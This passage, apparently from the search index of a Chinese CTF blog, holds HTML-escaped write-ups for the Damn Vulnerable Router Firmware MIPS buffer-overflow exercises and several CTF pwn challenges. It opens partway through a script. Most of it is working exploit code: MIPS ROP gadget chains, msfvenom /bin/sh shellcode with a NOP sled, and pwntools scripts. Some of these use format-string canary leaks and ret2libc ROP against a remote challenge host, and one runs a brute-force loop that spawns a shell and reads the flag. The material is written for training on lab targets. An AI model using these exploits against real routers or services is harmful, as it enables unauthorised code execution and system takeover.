buf += b&amp;quot;\x0c\x01\x01\x01&amp;quot;
shellcode=buf


gadget0=0x2FB10+libc_base
# .text:0002FB10 01 00 04 24                   li      $a0, 1
# .text:0002FB14 21 C8 20 02                   move    $t9, $s1
# .text:0002FB18 09 F8 20 03                   jalr    $t9 ; sub_2F818


gadget1=0x7730+libc_base
# .text:00007730 28 00 BF 8F                   lw      $ra, 0x18+var_s10($sp)
# .text:00007734 24 00 B3 8F                   lw      $s3, 0x18+var_sC($sp)
# .text:00007738 20 00 B2 8F                   lw      $s2, 0x18+var_s8($sp)
# .text:0000773C 1C 00 B1 8F                   lw      $s1, 0x18+var_s4($sp)
# .text:00007740 18 00 B0 8F                   lw      $s0, 0x18+var_s0($sp)
# .text:00007744 08 00 E0 03                   jr      $ra


gadget2=0x20F1C+libc_base
# .text:00020F1C 21 C8 40 02                   move    $t9, $s2
# .text:00020F20 24 00 BF 8F                   lw      $ra, 0x18+var_sC($sp)
# .text:00020F24 20 00 B2 8F                   lw      $s2, 0x18+var_s8($sp)
# .text:00020F28 1C 00 B1 8F                   lw      $s1, 0x18+var_s4($sp)
# .text:00020F2C 18 00 B0 8F                   lw      $s0, 0x18+var_s0($sp)
# .text:00020F30 08 00 20 03                   jr      $t9


gadget3=0x16DD0+libc_base
# .text:00016DD0 18 00 A4 27                   addiu   $a0, $sp, 0x38+var_20
# .text:00016DD4 21 C8 00 02                   move    $t9, $s0
# .text:00016DD8 09 F8 20 03                   jalr    $t9


gadget4=0x214A0+libc_base
# .text:000214A0 21 C8 80 00                   move    $t9, $a0
# .text:000214A4 18 00 A2 AF                   sw      $v0, 0x30+var_18($sp)
# .text:000214A8 09 F8 20 03                   jalr    $t9


#stack for gadget1
payload=b&amp;quot;a&amp;quot;*51 #padding
payload+=p32(gadget1) # $ra0-&amp;gt;gadget1
payload+=b&amp;quot;a&amp;quot;*0x18 #padding
payload+=b&amp;quot;aaaa&amp;quot; # $s0
payload+=p32(gadget2) # $s1-&amp;gt;gadget2
payload+=p32(sleep_func) # $s2-&amp;gt;sleep_func
payload+=b&amp;quot;aaaa&amp;quot; #padding
payload+=p32(gadget0) # $ra1-&amp;gt;gadget0


#stack for gadget2
payload+=b&amp;quot;a&amp;quot;*0x1c #padding
payload+=p32(gadget4) # $s0-&amp;gt;gadget
payload+=b&amp;quot;aaaa&amp;quot;*2 #padding
payload+=p32(gadget3) # $ra2-&amp;gt;gadget3

# gadget1-&amp;gt;gadget0-&amp;gt;gadget2-&amp;gt;sleep(1)-&amp;gt;gadget3-&amp;gt;gadget4

#stack for shellcode
payload+=b&amp;quot;a&amp;quot;*0x18
payload+=shellcode

io.recvuntil(b&amp;quot;Send Me Bytes:&amp;quot;)

io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">DVRF socket_bof</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/oIVkgnDGh/"" data-c="
          &lt;p&gt;与stack_bof_01类似，不过少了后门函数，mips架构关闭NX保护，所以此题打shellcode即可，可以提前调试出返回的栈上地址然后部署shellcode，最后覆盖&lt;code&gt;$ra&lt;/code&gt;为该地址即可&lt;br&gt;
部署shellcode时可以在shellcode前面加上nop sled增强泛用性&lt;br&gt;
jeb2上面给的nop sled是这个&lt;br&gt;
&lt;code&gt;# NOP sled (XOR $t0, $t0, $t0; as NOP is only null bytes): &amp;quot;\x26\x40\x08\x01&amp;quot;&lt;/code&gt;&lt;br&gt;
&lt;code&gt;$t0&lt;/code&gt;属于临时寄存器，nop的原则是对后续执行shellcode不影响，如果用msfvenom生成shellcode可以赌一手&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

payload=cyclic(0x300)

with open(&amp;quot;payload&amp;quot;,&amp;quot;w&amp;quot;) as f:
    f.write(payload.decode())
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用上面脚本生成padding&lt;br&gt;
使用bash脚本启动&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#! /bin/bash
cp $(which qemu-mipsel-static) ./q
./q  -L ./ -g 1234  ./stack_bof_02 &amp;quot;`cat payload`&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;gdb-multiarch连接上之后测算偏移量&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;*PC   0x66616163 (&#39;caaf&#39;)
─────────────────────────────────────────────────────────────────────────────────────[ DISASM / mips / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x66616163










─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ fp sp 0x407ffd08 ◂— 0x66616164 (&#39;daaf&#39;)
01:0004│       0x407ffd0c ◂— 0x66616165 (&#39;eaaf&#39;)
02:0008│       0x407ffd10 ◂— 0x66616166 (&#39;faaf&#39;)
03:000c│       0x407ffd14 ◂— 0x66616167 (&#39;gaaf&#39;)
04:0010│       0x407ffd18 ◂— 0x66616168 (&#39;haaf&#39;)
05:0014│       0x407ffd1c ◂— 0x66616169 (&#39;iaaf&#39;)
06:0018│       0x407ffd20 ◂— 0x6661616a (&#39;jaaf&#39;)
07:001c│       0x407ffd24 ◂— 0x6661616b (&#39;kaaf&#39;)
───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0 0x66616163
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&amp;gt; cyclic -l 0x66616163
Finding cyclic pattern of 4 bytes: b&#39;caaf&#39; (hex: 0x63616166)
Found at offset 508
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以测出来偏移为508&lt;br&gt;
这道题msfvenom生成的shellcode不太稳，可以多生成几次试试，也可以用shell-strom上有的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;┌─[fk@fk]─[~]
└──╼ $msfvenom -p linux/mipsle/exec  CMD=/bin/sh  --arch mipsle --platform linux -f py --bad-chars &amp;quot;\x00&amp;quot;
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=51, char=0x00)
Attempting to encode payload with 1 iterations of mipsle/byte_xori
mipsle/byte_xori succeeded with size 156 (iteration=0)
mipsle/byte_xori chosen with final size 156
Payload size: 156 bytes
Final size of py file: 778 bytes
buf =  b&amp;quot;&amp;quot;
buf += b&amp;quot;\xc6\xff\x0e\x24\x27\x70\xc0\x01\xac\xff\x0b\x24&amp;quot;
buf += b&amp;quot;\xff\xff\x10\x05\xde\x86\x08\x28\x27\x58\x60\x01&amp;quot;
buf += b&amp;quot;\x21\xc8\xeb\x03\x21\x80\xeb\x03\xee\xa5\x17\x28&amp;quot;
buf += b&amp;quot;\xff\xff\x31\x83\xfc\xff\x0d\x24\x27\x30\xa0\x01&amp;quot;
buf += b&amp;quot;\xfe\xff\xcf\x20\xfc\xff\x28\x83\x21\xb8\xef\x02&amp;quot;
buf += b&amp;quot;\x12\x89\x03\x39\x2b\xf0\xee\x02\xfc\xff\x23\xa3&amp;quot;
buf += b&amp;quot;\xfa\xff\xc0\x17\x21\xc8\x2f\x03\xfc\xff\x04\x26&amp;quot;
buf += b&amp;quot;\xcb\xff\x0a\x24\x27\x28\x40\x01\x33\x10\x02\x24&amp;quot;
buf += b&amp;quot;\x0c\x54\x4a\x01\x12\x12\x12\x12\x74\x14\x14\x36&amp;quot;
buf += b&amp;quot;\xed\xed\xc2\x16\xed\xed\x14\x3a\xf2\xed\xaf\x35&amp;quot;
buf += b&amp;quot;\x13\x02\xf6\x35\x0d\xe2\x96\x36\xfa\xed\xb6\xbd&amp;quot;
buf += b&amp;quot;\xfe\xed\xb2\xbd\xfa\xed\xb7\x35\xb9\x1d\x10\x36&amp;quot;
buf += b&amp;quot;\x1e\x13\x13\x13\x3d\x70\x7b\x7c\x3d\x61\x7a\x12&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;注意exp里面&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;mips&#39;,endian=&#39;little&#39;,bits=32)

# libc_addr=0x3fecd000

payload=b&amp;quot;&amp;quot;

# NOP sled (XOR $t0, $t0, $t0; as NOP is only null bytes)
for i in range(30):
    payload += b&amp;quot;\x26\x40\x08\x01&amp;quot;

buf =  b&amp;quot;&amp;quot;
buf += b&amp;quot;\xc6\xff\x0e\x24\x27\x70\xc0\x01\xac\xff\x0b\x24&amp;quot;
buf += b&amp;quot;\xff\xff\x10\x05\xde\x86\x08\x28\x27\x58\x60\x01&amp;quot;
buf += b&amp;quot;\x21\xc8\xeb\x03\x21\x80\xeb\x03\xee\xa5\x17\x28&amp;quot;
buf += b&amp;quot;\xff\xff\x31\x83\xfc\xff\x0d\x24\x27\x30\xa0\x01&amp;quot;
buf += b&amp;quot;\xfe\xff\xcf\x20\xfc\xff\x28\x83\x21\xb8\xef\x02&amp;quot;
buf += b&amp;quot;\x12\x89\x03\x39\x2b\xf0\xee\x02\xfc\xff\x23\xa3&amp;quot;
buf += b&amp;quot;\xfa\xff\xc0\x17\x21\xc8\x2f\x03\xfc\xff\x04\x26&amp;quot;
buf += b&amp;quot;\xcb\xff\x0a\x24\x27\x28\x40\x01\x33\x10\x02\x24&amp;quot;
buf += b&amp;quot;\x0c\x54\x4a\x01\x12\x12\x12\x12\x74\x14\x14\x36&amp;quot;
buf += b&amp;quot;\xed\xed\xc2\x16\xed\xed\x14\x3a\xf2\xed\xaf\x35&amp;quot;
buf += b&amp;quot;\x13\x02\xf6\x35\x0d\xe2\x96\x36\xfa\xed\xb6\xbd&amp;quot;
buf += b&amp;quot;\xfe\xed\xb2\xbd\xfa\xed\xb7\x35\xb9\x1d\x10\x36&amp;quot;
buf += b&amp;quot;\x1e\x13\x13\x13\x3d\x70\x7b\x7c\x3d\x61\x7a\x12&amp;quot;


payload +=buf
stack_addr=0x407ffc08
payload+=b&amp;quot;a&amp;quot;*(508-len(payload))+p32(stack_addr)

with open(&amp;quot;payload&amp;quot;,&amp;quot;w&amp;quot;) as f:
	f.write(payload)
# io=process(b&amp;quot;./q  -L ./ -g 1234 ./stack_bof_01 &amp;quot;.decode()+payload,shell=True)

# io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1692632215340.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">DVRF stack_bof_02</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/9lLK_Patw/"" data-c="
          &lt;p&gt;&lt;code&gt;binwalk -Me&lt;/code&gt;提取固件后&lt;br&gt;
使用ida查看，发现程序从命令行参数中传递&lt;code&gt;strcpy&lt;/code&gt;的数据&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[200]; // [sp+18h] [+18h] BYREF

  if ( argc &amp;lt; 2 )
  {
    puts(&amp;quot;Usage: stack_bof_01 &amp;lt;argument&amp;gt;\r\n-By b1ack0wl\r&amp;quot;);
    exit(1);
  }
  puts(&amp;quot;Welcome to the first BoF exercise!\r\n\r&amp;quot;);
  strcpy(v4, argv[1]);
  printf(&amp;quot;You entered %s \r\n&amp;quot;, v4);
  return 65;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过&lt;code&gt;cyclic&lt;/code&gt;生成&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

payload=cyclic(0x300)

with open(&amp;quot;payload&amp;quot;,&amp;quot;w&amp;quot;) as f:
    f.write(payload.decode())
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里我们使用&lt;code&gt;qemu-user&lt;/code&gt;来模拟，写一个bash脚本帮助我们初始化&lt;br&gt;
记得把所需的链接库目录复制到程序所在目录下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#! /bin/bash
cp $(which qemu-mipsel-static) ./q
./q  -L ./ -g 1234 ./stack_bof_01 &amp;quot;`cat payload`&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后使用&lt;code&gt;gdb-multiarch&lt;/code&gt;，使用&lt;code&gt;set arch mips&lt;/code&gt;指定架构，&lt;code&gt;target remote:1234&lt;/code&gt;开启远程调试，根据&lt;code&gt;cyclic -l&lt;/code&gt;可以算出偏移&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;*GP   0x448b80
*FP   0x407fffc8 ◂— 0x63616163 (&#39;caac&#39;)
*SP   0x407fffc8 ◂— 0x63616163 (&#39;caac&#39;)
*PC   0x63616162 (&#39;baac&#39;)
───────────────────────────────────────[ DISASM ]───────────────────────────────────────
Invalid address 0x63616162






───────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ fp sp 0x407fffc8 ◂— 0x63616163 (&#39;caac&#39;)
01:0004│       0x407fffcc ◂— 0x63616164 (&#39;daac&#39;)
02:0008│       0x407fffd0 ◂— 0x63616165 (&#39;eaac&#39;)
03:000c│       0x407fffd4 ◂— 0x63616166 (&#39;faac&#39;)
04:0010│       0x407fffd8 ◂— 0x63616167 (&#39;gaac&#39;)
05:0014│       0x407fffdc ◂— 0x63616168 (&#39;haac&#39;)
06:0018│       0x407fffe0 ◂— 0x63616169 (&#39;iaac&#39;)
07:001c│       0x407fffe4 ◂— 0x6361616a (&#39;jaac&#39;)
─────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────
 ► f 0 0x63616162
────────────────────────────────────────────────────────────────────────────────────────
pwndbg&amp;gt; cyclic -l 0x63616162
204
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;尝试按照x86的思路直接覆盖&lt;code&gt;$ra&lt;/code&gt;，这里使用bytes存在null bytes读不进去，最后用的str&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;mips&#39;,endian=&#39;little&#39;,bits=32)

payload=&#39;a&#39;*204+&#39;\xe0\x08\x40&#39;

io=process(b&amp;quot;./q  -L ./ -g 1234 ./stack_bof_01 &amp;quot;.decode()+payload,shell=True)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后异常&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;*S8   0x61616161 (&#39;aaaa&#39;)
*GP   0x448b80
 FP   0x0
*SP   0x40800038 ◂— 0
*PC   0x407ff2a9 ◂— beqz   $v0, 0x4081f27d /* 0x10407ff4 */
───────────────────────────────────────[ DISASM ]───────────────────────────────────────
 ► 0x407ff2a9    beqz   $v0, 0x4081f27d
 
   0x407ff2ad    swr    $ra, -0xf($at)
   0x407ff2b1    ll     $zero, 0x7ff4($v0)



───────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ s0 sp 0x40800038 ◂— 0
01:0004│       0x4080003c —▸ 0x40800114 —▸ 0x4080029e ◂— jalx   0x41ccbcb8 /* 0x74732f2e; &#39;./stack_bof_01&#39; */
02:0008│       0x40800040 —▸ 0x3ffba724 ◂— 0x4c475f00
03:000c│       0x40800044 —▸ 0x3ffba354 ◂— 0
04:0010│       0x40800048 —▸ 0x3feed5d0 ◂— negu   $v0, $a0 /* 0x41023 */
05:0014│       0x4080004c ◂— 0
... ↓          2 skipped
─────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────
 ► f 0 0x407ff2a9
────────────────────────────────────────────────────────────────────────────────────────
pwndbg&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;参考Swe3ty博客：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在MIPS中，函数内部会通过&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mn&gt;9&lt;/mn&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;寄&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;存&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;器&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;和&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;t9寄存器和&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;寄&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;存&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;器&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;和&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;gp寄存器来找数据，地址等。同时在mips的手册内默认$t9的值为当前函数的开始地址，这样才能正常的索引&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在&lt;code&gt;libc.so.0&lt;/code&gt;中存在gadget，不过mipsrop找不到，可以手动定位到此处&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:00006B20 00 00 B9 8F                   lw      $t9, arg_0($sp)
.text:00006B24 09 F8 20 03                   jalr    $t9
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;先手动关闭地址随机化&lt;br&gt;
对于libc基址，可以对程序函数下断点，建议使用&lt;code&gt;b *$rebase(0x*)&lt;/code&gt;的方式加断点，调试半天才想起来这个，跳转过去查看got地址，然后手算&lt;br&gt;
user模式下vmmap并不方便使用，也可以手动查看进程内存映射&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo su
echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo netstat -tunpl|grep 1234 #查看进程PID
sudo cat /proc/*/maps   #查看内存映射，*为进程PID
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;80eee000-80f29000 r--p 00000000 00:19 562334                             /home/fk/Desktop/cve/DVRF-master/Firmware/_DVRF_v05.bin.extracted/squashfs-root/pwnable/Intro/lib/libc.so.0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后还是使用&lt;code&gt;start.sh&lt;/code&gt;中的命令，所以最终exp修改如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;mips&#39;,endian=&#39;little&#39;,bits=32)

libc_addr=0x80eee000
gadget1=0x6B20+libc_addr
payload=&amp;quot;a&amp;quot;*204+p32(gadget1)+p32(0x4008e0)


with open(&amp;quot;payload&amp;quot;,&amp;quot;w&amp;quot;) as f:
	f.write(payload)
# io=process(b&amp;quot;./q  -L ./ -g 1234 ./stack_bof_01 &amp;quot;.decode()+payload,shell=True)

# io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">DVRF stack_bof_01</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/YyHpbs2f-/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWN：&lt;/h3&gt;
&lt;h4 id=&#34;test_your_nc&#34;&gt;Test_Your_nc：&lt;/h4&gt;
&lt;p&gt;对程序进行逆向后nc输入指定字符串即可&lt;/p&gt;
&lt;h4 id=&#34;how_2_getshell&#34;&gt;How_2_getshell?:&lt;/h4&gt;
&lt;p&gt;限制输入长度且比较&lt;code&gt;/bin/sh&lt;/code&gt;字符串，输入&lt;code&gt;sh&lt;/code&gt;即可&lt;/p&gt;
&lt;h4 id=&#34;bignum&#34;&gt;bignum？:&lt;/h4&gt;
&lt;p&gt;输入&lt;code&gt;-1&lt;/code&gt;即可绕过&lt;/p&gt;
&lt;h4 id=&#34;cr4zy_thursday&#34;&gt;Cr4zy_Thursday!!!：&lt;/h4&gt;
&lt;p&gt;64位格式化字符串任意地址写，注意对齐&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;101.42.30.15&amp;quot;,8405)

# gdb.attach(io)
# pause()

flag_addr=0x060108C

payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format(0x32,8).encode().ljust(0x10,b&amp;quot;\x00&amp;quot;)+p64(flag_addr)

io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;stack_overflow&#34;&gt;Stack_Overflow:&lt;/h4&gt;
&lt;p&gt;64位栈溢出&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;101.42.30.15&amp;quot;,8406)


# gdb.attach(io)
# pause()

payload=cyclic(0x28)+p64(0x400717)
io.sendafter(b&amp;quot;ght\n&amp;quot;,payload)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;你喜欢金丝雀吗&#34;&gt;你喜欢金丝雀吗：&lt;/h4&gt;
&lt;p&gt;出题人的本意应该是好的，编译器执行的更好了&lt;br&gt;
不同以往，程序最后结束的时候进入了另外一个分支：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;loc_80486A5:
mov     ecx, [ebp+var_4]
leave
lea     esp, [ecx-4]
retn
; } // starts at 80485F9
main endp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过格式化字符串获取canary和栈地址&lt;br&gt;
获取canary后不能直接溢出写，需要通过控制栈上数据进一步控制寄存器&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pwn&amp;quot;)
# io=remote(&amp;quot;101.42.30.15&amp;quot;,8407)

gdb.attach(io)
pause()

io.sendafter(b&amp;quot;you!!!!!\n&amp;quot;,b&amp;quot;%15$p.%1$p&amp;quot;.ljust(0x10,b&amp;quot;.&amp;quot;))
canary=int(io.recv(10),16)
io.recvuntil(b&amp;quot;.&amp;quot;)
stack=int(io.recv(10),16)+0x10
print(&amp;quot;canary: &amp;quot;,hex(canary))
print(&amp;quot;stack: &amp;quot;,hex(stack))


payload=p32(0x80485e0)*8+p32(canary)+p32(stack)*3
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;原神启动&#34;&gt;原神，启动！：&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;where_to_go&lt;/code&gt;可以往栈上读数据，可以布置rop链&lt;br&gt;
&lt;code&gt;dress&lt;/code&gt;可以实现栈上写8字节&lt;br&gt;
一开始直接利用栈上写8字节特性修改ret地址低三字节，爆破半字节打one_gadget，1/16概率本地能出两个，远端开4个终端爆一晚上不通，改用rop的方式&lt;br&gt;
总之多调试一下就行了，最后泄露后建议返回main函数，不然寄存器值更改后容易卡住&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;,])

# io=process(&amp;quot;./ys&amp;quot;)
io=remote(&amp;quot;101.42.30.15&amp;quot;,8408)
elf=ELF(&amp;quot;./ys&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)


pop_rdi=0x4009b3
# gdb.attach(io)
# pause()

sleep(1)
io.recv()
sleep(1)
io.sendline(b&amp;quot;10086&amp;quot;)
sleep(1)
io.recv()
sleep(1)
io.send(b&amp;quot;qqqqqqqqqqqqqqqqqq&amp;quot;)
sleep(1)
io.recv()
sleep(1)
payload=p64(pop_rdi)+p64(elf.got[b&amp;quot;puts&amp;quot;])+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(0x4008f3)
io.send(payload*5)
sleep(1)
io.recv()
sleep(1)


# gdb.attach(io)
# pause()

io.sendline(b&amp;quot;56&amp;quot;)  #88
sleep(1)
io.recv()
sleep(1)
io.send(p64(0x400589))

# sleep(1)
# io.recv()
# sleep(1)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

# gdb.attach(io)
# pause()


sleep(1)
io.recv()
sleep(1)
io.sendline(b&amp;quot;10086&amp;quot;)
sleep(1)
io.recv()
sleep(1)
io.send(b&amp;quot;qqqqqqqqqqqqqqqqqq&amp;quot;)
sleep(1)
io.recv()
sleep(1)
payload=p64(pop_rdi)+p64(str_sh)+p64(sys_addr)+p64(0)
io.send(payload*5)
sleep(1)
io.recv()
sleep(1)

io.sendline(b&amp;quot;56&amp;quot;)  #88
sleep(1)
io.recv()
sleep(1)
io.send(p64(0x400589))



io.interactive()


# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

# Gadgets information
# ============================================================
# 0x00000000004009ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004009ae : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004009b0 : pop r14 ; pop r15 ; ret
# 0x00000000004009b2 : pop r15 ; ret
# 0x00000000004009ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004009af : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400670 : pop rbp ; ret
# 0x00000000004009b3 : pop rdi ; ret
# 0x00000000004009b1 : pop rsi ; pop r15 ; ret
# 0x00000000004009ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400589 : ret

# Unique gadgets found: 11
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后还是放一个爆破的脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;,])

while True:
    try:
        io=process(&amp;quot;./ys&amp;quot;)
        # io=remote(&amp;quot;101.42.30.15&amp;quot;,8408)
        elf=ELF(&amp;quot;./ys&amp;quot;)
        libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

        # gdb.attach(io)
        # pause()
        sleep(0.5)
        io.recv()
        # sleep(1)
        io.sendline(b&amp;quot;10086&amp;quot;)
        sleep(0.5)
        io.recv()
        # sleep(1)
        io.sendline(b&amp;quot;1&amp;quot;)
        sleep(0.5)
        io.recv()
        # sleep(1)
        io.sendline(b&amp;quot;88&amp;quot;)
        # sleep(1)

        io.recv()
        # sleep(1)
        # sleep(2)
        io.send(b&amp;quot;\x47\x12\x8f&amp;quot;)
        sleep(2)
        io.sendline(&amp;quot;ls&amp;quot;)
        sleep(2)
        ret = io.recv()
        if b&amp;quot;flag&amp;quot; in ret:
            io.sendline(&amp;quot;cat flag&amp;quot;)
            sleep(1)
            print(io.recv())
            print(&amp;quot;SUCCEED&amp;quot;)
            sys.exit(0)
        else:
            print(&amp;quot;FAILED&amp;quot;)
            io.close()

    except:
        io.close()
        continue

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
